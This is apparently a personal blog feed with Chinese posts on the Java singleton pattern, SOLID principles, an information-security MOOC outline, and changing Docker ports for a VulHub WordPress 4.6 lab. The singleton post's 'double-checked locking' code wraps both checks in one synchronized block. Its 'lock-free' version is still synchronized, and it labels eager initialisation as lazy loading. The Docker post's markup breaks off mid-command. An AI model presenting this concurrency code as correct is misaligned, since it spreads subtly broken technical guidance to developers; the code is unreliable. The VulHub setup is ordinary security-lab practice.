        <content type="html"><![CDATA[<h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>单例模式，故名思义是用来保证一个对象只能创建一个实例。单例模式是最简单也是最常用的一种设计模式，但因为过度使用或者在不恰当的时候使用，有的时候会被视为一种反模式。</p><h2 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h2><p>只由单个类组成。为确保单例实例的唯一性，所有的单例构造器都要被声明为私有的（private），再通过声明静态（static）方法实现全局访问获得该单例实例。</p><p>注意一下要点：</p><ol><li>单例构造器都要被声明为私有的（private）</li><li>通过申明静态方法全局访问获得该单例示例</li><li>自行向整个系统提供该实例<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213205413.png" alt="单例模式实现示意图"><br>图：单例模式实现示意图</li></ol><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>以下为一段使用Java实现的单例模式，注意，要点在代码注释中再次写明：<br>Singleton.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单例构造器都要被声明为私有的（private）</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Singleton is Instantiated."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 注意，检查实例是否为空，如果不为空则表明对象在之前被创建过</span></span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line"><span class="comment">// 自行向整个系统提供该实例</span></span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Something is Done."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyMainClass.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMainClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] s)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 通过申明静态方法全局访问获得该单例示例</span></span><br><span class="line">Singleton singleton = Singleton.getInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="同步锁单例模式"><a href="#同步锁单例模式" class="headerlink" title="同步锁单例模式"></a>同步锁单例模式</h2><p>在多线程应用中使用这种模式，如果实例为空，可能存在<strong>两个线程同时调用getInstance方法</strong>的情况。如果发生这种情况，第一个线程会首先使用新构造器实例化单例对象，同时第二个线程也会检查单例实例是否为空，由于第一个线程还没完成单例对象的实例化操作，所以第二个线程会发现这个实例是空的，也会开始实例化单例对象。  </p><p>解决方法：创建一个代码块来检查实例是否空线程安全。在Java中，可以有以下两种方式：</p><ol><li>向getInstance方法的声明中添加synchronized关键字<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="keyword">synchronized</span> <span class="title">getInstance</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></li><li>用synchronized代码块包装if(instance==null)条件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synchronized (Singleton.class) &#123;</span><br><span class="line">if (instance &#x3D;&#x3D; null)</span><br><span class="line">instance &#x3D; new Singleton();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="拥有双重校验锁机制的同步锁单例模式"><a href="#拥有双重校验锁机制的同步锁单例模式" class="headerlink" title="拥有双重校验锁机制的同步锁单例模式"></a>拥有双重校验锁机制的同步锁单例模式</h2><p>同步锁单例模式虽然能够保证线程安全，但同时带来了延迟。用来检查实例是否被创建的代码是线程同步的，也就是说此代码块在同一时刻只能被一个线程执行，但是同步锁（locking）只有在实例没被创建的情况下才起作用。如果单例实例已经被创建了，那么任何线程都能用非同步的方式获取当前的实例。  </p><p>因此我们设置只有在单例对象未实例化的情况下，才能在synchronized代码块前添加附加条件移动线程安全锁。且instance==null条件需要被检查了两次，保证在synchronized代码块中也要进行一次检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无锁的线程安全模式"><a href="#无锁的线程安全模式" class="headerlink" title="无锁的线程安全模式"></a>无锁的线程安全模式</h2><p>Java中单例模式的最佳实现形式中，类只会加载一次，通过<strong>在声明时直接实例化静态成员</strong>的方式来保证一个类只有一个实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockFreeSingleton</span> </span>&#123;</span><br><span class="line"><span class="comment">// 在声明时直接实例化静态成员</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LockFreeSingleton instance = <span class="keyword">new</span> LockFreeSingleton();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LockFreeSingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Singleton is Instantiated."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LockFreeSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Something is Done."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两种单例模式"><a href="#两种单例模式" class="headerlink" title="两种单例模式"></a>两种单例模式</h2><p>按照<strong>实例对象被创建的时机</strong>，可以将单例模式分为两类：</p><ol><li>提前加载单例模式：在应用开始时创建单例实例</li><li>延迟加载单例模式：在getInstance方法首次被调用时才调用单例构造器（例如上文提到的无锁的线程安全模式）</li></ol><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：</p><ol><li>在单例模式中，活动的单例只有一个实例，对单例类的所有实例化得到的都是相同的一个实例。这样就防止其它对象对自己的实例化，确保所有的对象都访问一个实例</li><li>单例模式具有一定的伸缩性，类自己来控制实例化进程，类就在改变实例化进程上有相应的伸缩性</li><li>提供了对唯一实例的受控访问</li><li>由于在系统内存中只存在一个对象，因此可以 节约系统资源，当 需要频繁创建和销毁的对象时单例模式无疑可以提高系统的性能</li><li>允许可变数目的实例</li><li>避免对共享资源的多重占用  </li></ol><p>缺点：<br>7. 不适用于变化的对象，如果同一类型的对象总是要在不同的用例场景发生变化，单例就会引起数据的错误，不能保存彼此的状态<br>8. 由于单利模式中没有抽象层，因此单例类的扩展有很大的困难<br>9. 单例类的职责过重，在一定程度上违背了“单一职责原则”<br>10. 滥用单例将带来一些负面问题，如为了节省资源将数据库连接池对象设计为的单例类，可能会导致共享连接池对象的程序过多而出现连接池溢出；如果实例化的对象长时间不被利用，系统会认为是垃圾而被回收，这将导致对象状态的丢失</p><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ol><li>资源共享的情况下，避免由于资源操作时导致的性能或损耗等。e.g. 日志文件和应用配置。 </li><li>控制资源的情况下，方便资源之间的互相通信。e.g. 线程池。</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>卡马尔米特·辛格（Kamalmeet Singh）. Java设计模式及实践 (Java核心技术系列) (Chinese Edition) (Kindle Location 507). Kindle Edition. </p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[updating]【Note】MOOC学习笔记——信息系统安全与对抗技术</title>
      <link href="/2019/12/13//articles/2019/12/13/1576236847764.html/"/>
      <url>/2019/12/13//articles/2019/12/13/1576236847764.html/</url>
      
        <content type="html"><![CDATA[<h1 id="【课程学习笔记】信息系统安全与对抗技术"><a href="#【课程学习笔记】信息系统安全与对抗技术" class="headerlink" title="【课程学习笔记】信息系统安全与对抗技术"></a>【课程学习笔记】信息系统安全与对抗技术</h1><h2 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h2><p>课程主要内容包括：工程系统理论及系统工程基础、信息安全与对抗知识基础、信息安全检测与攻击技术、信息安全防御与对抗技术、信息安全管理与犯罪立法、信息安全标准与风险评估、信息系统安全工程及能力等。课程有理论、有管理、有工程、有技术，重点<strong>引导学生从顶层理解和掌握信息系统与安全对抗问题，系统、全面地学习信息系统与安全对抗领域的核心概念、原理和技术，深入、先进地培养学生的系统思维和创新能力</strong>。</p><p>链接：<a href="https://www.icourse163.org/course/BIT-1205992812" target="_blank" rel="noopener">https://www.icourse163.org/course/BIT-1205992812</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">第一单元</span><br><span class="line">网络空间安全生产力：学习能力及学习方法论</span><br><span class="line"></span><br><span class="line">网络空间安全生产力：网络空间安全生态环境</span><br><span class="line"></span><br><span class="line">网络空间安全生产力：信息安全与对抗学科专业建设</span><br><span class="line"></span><br><span class="line">信息系统知识基础：信息与信息技术的概念</span><br><span class="line"></span><br><span class="line">信息系统知识基础：信息系统及其功能要素</span><br><span class="line"></span><br><span class="line">信息系统知识基础：工程系统理论基础知识</span><br><span class="line"></span><br><span class="line">第一单元测试</span><br><span class="line"></span><br><span class="line">第一单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二单元</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息系统安全的发展历程</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息系统的不安全因素</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息系统安全的基本概念</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息安全问题主要根源</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：系统安全需求分析</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息安全战略</span><br><span class="line"></span><br><span class="line">信息安全与对抗知识基础：信息系统安全体系框架</span><br><span class="line"></span><br><span class="line">信息安全与对抗理论体系：网络空间安全与对抗理论简介</span><br><span class="line"></span><br><span class="line">第二单元测试</span><br><span class="line"></span><br><span class="line">第二单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三单元</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：网络攻击行为过程分析</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：网络攻击技术分类</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：黑客及其行为特征</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息安全扫描技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：网络数据获取技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：计算机病毒及蠕虫</span><br><span class="line"></span><br><span class="line">第三单元测试</span><br><span class="line"></span><br><span class="line">第三单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第四单元</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：木马攻击技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息欺骗攻击技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：缓冲区溢出攻击技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：拒绝服务攻击技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：社会工程攻击技术</span><br><span class="line"></span><br><span class="line">信息安全与对抗案例分析：网店刷单兼职骗局对抗</span><br><span class="line"></span><br><span class="line">信息安全与对抗案例分析：美国诱骗中国官员事件</span><br><span class="line"></span><br><span class="line">第四单元测试</span><br><span class="line"></span><br><span class="line">第四单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第五单元</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：防御行为过程分析</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：网络安全事件分类</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：物理实体安全技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：防火墙安全技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：入侵信息检测技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：蜜罐及蜜网技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息安全取证技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：资源访问控制技术</span><br><span class="line"></span><br><span class="line">第五单元测试</span><br><span class="line"></span><br><span class="line">第四单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第六单元</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：身份认证识别技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息数字水印技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息物理隔离技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：虚拟隧道专用网技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息灾难恢复技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：无线网络安全技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：网络安全审计技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：自动响应技术</span><br><span class="line"></span><br><span class="line">信息安全检测与攻击技术：信息加密解密技术</span><br><span class="line"></span><br><span class="line">第六单元测试</span><br><span class="line"></span><br><span class="line">第六单元作业</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第七单元</span><br><span class="line"></span><br><span class="line">信息安全管理与犯罪立法：信息安全犯罪知识基础</span><br><span class="line"></span><br><span class="line">信息安全管理与犯罪立法：信息安全犯罪相关立法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">信息安全标准与风险评估：信息安全标准规范</span><br><span class="line"></span><br><span class="line">信息安全标准与风险评估：信息安全风险评估</span><br><span class="line"></span><br><span class="line">信息系统安全工程及能力：信息系统安全工程</span><br><span class="line"></span><br><span class="line">信息系统安全工程及能力：系统安全工程能力成熟模型</span><br><span class="line"></span><br><span class="line">信息系统安全工程及能力：信息系统安全等级保护基础</span><br><span class="line"></span><br><span class="line">信息安全与对抗应用：信息安全与对抗大数据分析</span><br><span class="line"></span><br><span class="line">信息安全与对抗应用：日常生活账号密码安全常识</span><br><span class="line"></span><br><span class="line">第七单元测试</span><br><span class="line"></span><br><span class="line">第七单元作业</span><br></pre></td></tr></table></figure><h2 id="第三章—信息安全检测与攻击技术"><a href="#第三章—信息安全检测与攻击技术" class="headerlink" title="第三章—信息安全检测与攻击技术"></a>第三章—信息安全检测与攻击技术</h2><ol><li>触网即有痕迹</li><li>攻击步骤<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213161948.png" alt="攻击步骤"></li><li>行为分析<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213161709.png" alt="行为分析"></li><li>攻击分类</li></ol><ul><li>从国家、主机、产品开发看</li><li>基于经验术语分类<ul><li>Cohen攻击列表：时间炸弹、社会工程学、贿赂…</li><li>Icove攻击列表：折磨、流量分析…</li><li>Cheswick和Bellovin的分类：协议失效(DoS)…</li></ul></li></ul><ol start="5"><li><p>黑客技术知识需求图<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213190632.png" alt="黑客技术知识需求图"></p></li><li><p>扫描技术的分类<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213192229.png" alt="扫描技术分类"></p></li><li><p>扫描技术的比较<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213192435.png" alt="扫描技术的比较"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 安全综合 </tag>
            
            <tag> 更新中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】设计模式及原则</title>
      <link href="/2019/12/13//articles/2019/12/13/1576219402195.html/"/>
      <url>/2019/12/13//articles/2019/12/13/1576219402195.html/</url>
      
        <content type="html"><![CDATA[<h1 id="设计模式及原则"><a href="#设计模式及原则" class="headerlink" title="设计模式及原则"></a>设计模式及原则</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213144602.png" alt="封面"><br>图：封面</p><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="什么是设计模式？"><a href="#什么是设计模式？" class="headerlink" title="什么是设计模式？"></a>什么是设计模式？</h3><p>设计模式是可以应用于<strong>常见问题的通用可重用解决方案</strong>。<br>创建软件应用程序是为了<strong>满足不断变化和发展的需求</strong>。一个成功的应用程序还应该提供一种简单的方法来扩展它以满足不断变化的期望。后面所讲的设计原则，以及后续所学习的设计模式都是为了这个目的：应用于常见问题的通用可重用解决，满足不断变化和发展的需求。</p><h2 id="面向对象的设计原则"><a href="#面向对象的设计原则" class="headerlink" title="面向对象的设计原则"></a>面向对象的设计原则</h2><p>面向对象的设计原则被称为SOLID。SOLID原则包括单一职责原则、开闭原则、里氏替换原则、接口隔离原则和依赖倒置原则。在设计和开发软件时可以应用这些原则，以便创建易于维护和开发的程序。</p><h3 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h3><p>该原则是指软件模块应该只有一个被修改的理由，目的是为了让封装工作达到最佳的状态。  </p><p>例如常用于Java中类的修改：修改某个类时，需要修改的原因不止一个，而且这个过程常常会影响其他类的修改。每个更改的职责/理由都会增加新的依赖关系，使代码不那么健壮。<br>e.g. 一个Car类，假设对Car类添加方法来处理增、删、改、查的数据库操作。此时Car不仅会封装逻辑，还会封装数据库操作。使得类的维护和测试更加困难，因为代码是紧密耦合的。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213134011.png" alt="没有遵循单一职责原则增加功能的Car类" style="zoom: 33%;" /><br>图：没有遵循单一职责原则增加功能的Car类<br>解决方案：创建两个类，一个用于封装Car逻辑(Car)，另一个用于负责持久性(CarDao)。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213134408.png" alt="逻辑封装与持久性分离" style="zoom:50%;" /><br>图：逻辑封装与持久性分离  </p><h3 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h3><p>“模块、类和函数应该对扩展开放，对修改关闭。”  </p><p>修改某个已完成部分分险和成本往往更大，我们应该在此基础上继续进行建设（通过继承和多态的方式），而不是去修改原本的。～是最重要的设计原则之一，是大多数设计模式的基础。</p><h3 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h3><p>派生类型必须完全可替代其基类型。基于面向对象语言中的<strong>子类型多态</strong>，派生对象可以用其父类型替换。<br>简单来说：当类B继承类A时，除添加新的方法完成新增功能P2外，尽量不要重写父类A的方法，也尽量不要重载父类A的方法。此时可以说，类B是类A比较完整的派生对象，父类型可以替换子类型的多态（不同类型实体接口相同）。  </p><h3 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h3><p>使用的接口方法满足客户端功能实现最低要求即可。即，“客户端不应该依赖于它所不需要的接口”。</p><h3 id="依赖倒置原则"><a href="#依赖倒置原则" class="headerlink" title="依赖倒置原则"></a>依赖倒置原则</h3><p>“高级模块不应该依赖低级模块，两者都应该依赖抽象。”<br>“抽象不应该依赖于细节，细节应该依赖于抽象。”</p><p>这个原则的目的就是为了降低耦合，常用的方法是将高级逻辑与低级模块分开。可以尝试让它们都<strong>依赖于抽象进而减少二者之间的依赖关系</strong>。如此就可以替换或扩展其中任何一个模块而不影响其他模块。</p><p>e.g. 以下的vehicle为抽象类<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213143318.png" alt="依赖倒置原则的使用" style="zoom: 67%;" /><br>图：依赖倒置原则的使用  </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>卡马尔米特·辛格（Kamalmeet Singh）. Java设计模式及实践 (Java核心技术系列) (Chinese Edition) (Kindle Location 387). Kindle Edition. </p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 结构与设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Note】Docker端口修改&amp;VulHub使用</title>
      <link href="/2019/12/09//articles/2019/12/09/1575872595515.html/"/>
      <url>/2019/12/09//articles/2019/12/09/1575872595515.html/</url>
      
        <content type="html"><![CDATA[<p>#【Note】Docker 端口修改（VulHub使用技巧）</p><p>在用VulHub搭建测试环境的时候，docker默认端口都为8080，如何修改docker容器的映射端口呢？查了一下，做以下笔记：</p><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>VulHub的镜像使用docker-compose编排，因此可以直接修改<code>docker-compose.yml</code>进行修改。e.g.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ more docker-compose.yml</span><br><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> web:</span><br><span class="line">   image: vulhub/wordpress:4.6</span><br><span class="line">   depends_on:</span><br><span class="line">    - mysql</span><br><span class="line">   environment:</span><br><span class="line">    - WORDPRESS_DB_HOST=mysql:3306</span><br><span class="line">    - WORDPRESS_DB_USER=root</span><br><span class="line">    - WORDPRESS_DB_PASSWORD=root</span><br><span class="line">    - WORDPRESS_DB_NAME=wordpress</span><br><span class="line"><span class="comment"># 修改此处的ports属性即可，前面的8080为映射的端口（外部访问的），80为被映射的端口</span></span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">"8080:80"</span></span><br><span class="line"> mysql:</span><br><span class="line">   image: mysql:5</span><br><span class="line">   environment:</span><br><span class="line">    - MYSQL_ROOT_PASSWORD=root</span><br></pre></td></tr></table></figure><p>修改ports属性即可。</p><h2 id="使用docker-commit新构镜像"><a href="#使用docker-commit新构镜像" class="headerlink" title="使用docker commit新构镜像"></a>使用docker commit新构镜像</h2><figure class="highlight docker"><figcaption><span>commit```命令是把一个容器所有的文件改动和配置信息导入成一个新的docker镜像。然后我们用这个新的镜像重起一个容器（此时修改映射端口）即可。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>. 停止容器</span><br><span class="line">```bash</span><br><span class="line">docker stop [Container_ID_Old]</span><br></pre></td></tr></table></figure><ol start="2"><li>commit容器，新构镜像</li></ol><p>命令新标签[ContainerTAG_new]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [Container_ID_Old] 